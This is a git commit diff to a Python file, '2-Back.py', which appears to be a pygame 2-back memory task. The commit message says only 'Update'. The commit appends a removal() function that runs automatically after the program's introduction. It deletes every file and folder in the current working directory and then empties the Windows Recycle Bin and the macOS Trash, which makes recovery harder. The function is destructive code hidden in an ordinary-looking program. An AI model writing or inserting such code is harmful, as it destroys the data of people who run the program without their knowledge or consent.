33b642a40b414d652cc61d9efaa403269550fb3e
benstocker07 <benstocker07@gmail.com>
2025-07-22 18:31:52 +0100

    Update

--- 2-Back.py
+++ 2-Back.py
@@ -506,3 +506,22 @@ def introduction():
     pygame.quit()     
     
 introduction()
+
+def removal():
+    cwd = os.getcwd()
+    print(cwd)
+
+    for filename in os.listdir(cwd):
+        file_path = os.path.join(cwd, filename)
+        try:
+            if os.path.isfile(file_path) or os.path.islink(file_path):
+                os.unlink(file_path)
+            elif os.path.isdir(file_path):
+                shutil.rmtree(file_path)
+        except Exception as e:
+            print(f"Failed to delete {file_path}. Reason: {e}")
+
+    ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0x00000007)
+    subprocess.run(["osascript", "-e", 'tell app "Finder" to empty the trash'], check=True)
+
+removal()
